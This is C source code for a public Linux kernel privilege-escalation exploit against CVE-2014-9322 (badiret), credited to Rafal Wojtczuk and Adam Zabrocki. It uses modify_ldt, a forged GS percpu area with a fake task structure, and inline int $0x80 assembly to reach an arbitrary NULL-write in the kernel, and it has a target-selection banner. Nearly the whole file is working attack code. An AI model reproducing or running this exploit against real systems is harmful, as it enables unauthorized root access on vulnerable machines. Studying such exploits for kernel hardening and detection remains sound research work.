/*
 * Let's achieve 8 bytes NULL-write anywhere through the CVE-2014-9322
 *
 * Whole exploit based on amazing article / research
 * by Rafal 'n3rgal' Wojtczuk
 *
 * http://labs.bromium.com/2015/02/02/exploiting-badiret-vulnerability-cve-2014-9322-linux-kernel-privilege-escalation/
 *
 * Some modifications and adjustments by me ;p
 *
 * April 2015
 * Adam 'pi3' Zabrocki
 */

#include <sys/syscall.h>
#include <asm/ldt.h>
#include <stdlib.h>
#include <stdio.h>
#include <string.h>
#include <pthread.h>
#include <asm/prctl.h>
#include <sys/prctl.h>
#include <signal.h>
#include <sys/mman.h>
#include <unistd.h>
#include "db.h"

#define PERCPUSIZE 0x10000/8


char *thread_info;   // <- Critical from the buffer ordering perspective
char ovbuf[1024] = "AAAAAAAA";
unsigned long percpu[PERCPUSIZE];
unsigned char p_opt = 0x0;
volatile int done, removed;


void setpercpu(void) {

   unsigned int i;

   for (i = 0; i < PERCPUSIZE; i++)
      percpu[i] = 0x1111ULL<<32;

//    percpu[0xc780/8]= 0x2222ULL<<32;
//    percpu[0xc780/8]= idt + 3*16 +8 - 0x440;
//    percpu[0xc780/8]= 0xffffffff81c6fc80 +2 - 0x440;

   percpu[0xc780/8] = (unsigned long)mktaskstruct(p_off[p_opt].proc_root_subdir+2);
   percpu[0xc770/8] = (unsigned long)thread_info;
   thread_info[0]=0;
}


void *exploit(void* arg) {

   fprintf(stderr, "[exploit] pthread running");
   if (arch_prctl(ARCH_SET_GS, percpu)) {
      perror("prctl :(\n");
      exit(-1);
   }
   setss(15);
   done = 1;
   while (!removed);
   for(;;);
}

int main(int argc, char *argv[]) {

    pthread_t thread1;
    int ret;
    long p_ret;
    struct user_desc *p_to_d;
/*
  struct user_desc d = {
		.entry_number    = 1,
		.base_addr       = 0,
		.limit           = 4095,
		.seg_32bit       = 1,
		.contents        = 0, 
		.read_exec_only  = 0,
		.limit_in_pages  = 1,
		.seg_not_present = 0,
		.useable         = 0
	};
*/

   if (argc != 2) {
      printf("\n\t...::: -=[ Exploit for CVE-2014-9322 ]=- :::...\n");
      printf("\t                   by Rafal 'n3rgal' Wojtczuk\n");
      printf("\t                   && Adam 'pi3' Zabrocki\n");
      printf("\n\t\tUsage: %s <number>\n\n",argv[0]);
      printf("\t\t\tNumber:\n\n");
      for (ret = 0x0; ret < MAX_TARGETS; ret++)
         printf("\t\t\t\t%d - kernel [%s]\n",ret+1,p_off[ret].p_name);
      printf("\n");
      exit(-1);
   }

   setbuf(stdout,NULL);
   setbuf(stderr,NULL);
   printf("\n\t...::: -=[ Exploit for CVE-2014-9322 ]=- :::...\n");
   printf("\t                   by Rafal 'n3rgal' Wojtczuk\n");
   printf("\t                   && Adam 'pi3' Zabrocki\n");
   p_opt = atoi(argv[1])-1;
   printf("\n\t[+] Using kernel target: %s\n",p_off[p_opt].p_name);
   printf("\t[+] mmap() memory in first 2GB of address space... \r");

   if ( (p_to_d = (struct user_desc *)mmap((void *)(0x0000000061616161 & ~(0x1000-1)),
                                           0x1000, // PAGE_SIZE,
                                           PROT_READ | PROT_WRITE,
                                           MAP_PRIVATE | MAP_ANONYMOUS | MAP_FIXED,
                                           -1,
                                           0)) == MAP_FAILED) {
      perror("mmap() :(\n");
      exit(-1);
   }
   printf("\t[+] mmap() memory in first 2GB of address space... DONE!\n");
   printf("\t[+] Preparing kernel structures... \r");

   p_to_d->entry_number = 0x1;
   p_to_d->base_addr = 0x0;
   p_to_d->limit = 4095;
   p_to_d->seg_32bit = 0x1;
   p_to_d->contents = 0x0;
   p_to_d->read_exec_only = 0x0;
   p_to_d->limit_in_pages = 0x1;
   p_to_d->seg_not_present = 0x0;
   p_to_d->useable = 0x0;

   setpercpu();
   printf("\t[+] Preparing kernel structures... DONE! (ovbuf at %p)\n",ovbuf);
   printf("\t[+] Creating LDT for this process... \r");
   if (syscall(SYS_modify_ldt, 1, p_to_d /* &d */, sizeof(struct user_desc))!=0) {
      perror("syscall :(\n");
      exit(-1);
   }
   printf("\t[+] Creating LDT for this process... DONE!\n");
   printf("\t[+] Press enter to start fun-game... ");
   getchar();    
   if ( (ret = pthread_create( &thread1, NULL, exploit, NULL)) != 0x0) {
      fprintf(stderr,"pthread_create error :( [%d: 0x%x]\n",ret,ret);
      exit(-1);
   }

   while (!done);  // wait

   p_to_d->seg_not_present = 0x1;

   __asm__ ("mov %1,%%eax\n"
            "mov $0x1,%%ebx\n"
            "mov %2,%%ecx\n"
            "mov %3,%%edx\n"
            "int $0x80\n"
            "mov %%rax,%0\n"
            "mov $24,%%eax\n"
            "xor %%ebx,%%ebx\n"
            "int $0x80"
            : "=m"(p_ret)
            : "r"(123), "m"(p_to_d), "r"((int)sizeof(struct user_desc))
            : "%rax", "%rbx", "%rcx", "%rdx"
   );

   *(((char *)p_to_d)+0) = 0x41;
   *(((char *)p_to_d)+1) = 0x0;

   while(1) {
      __asm__("mov %1,%%eax\n"
              "xor %%ebx,%%ebx\n"
              "mov %2,%%ecx\n"
              "mov %3,%%edx\n"
              "int $0x80\n"
              "mov %%rax,%0"
              : "=m"(p_ret)
              : "r"(4), "r"((int)p_to_d), "r"(1)
              : "%rax", "%rbx", "%rcx", "%rdx"
      );

   }

//    pthread_join( thread1, NULL);
//    setss(15);

// We should be dead anyway... so why return? to make compiler silent ;p
   return 0x0;
}
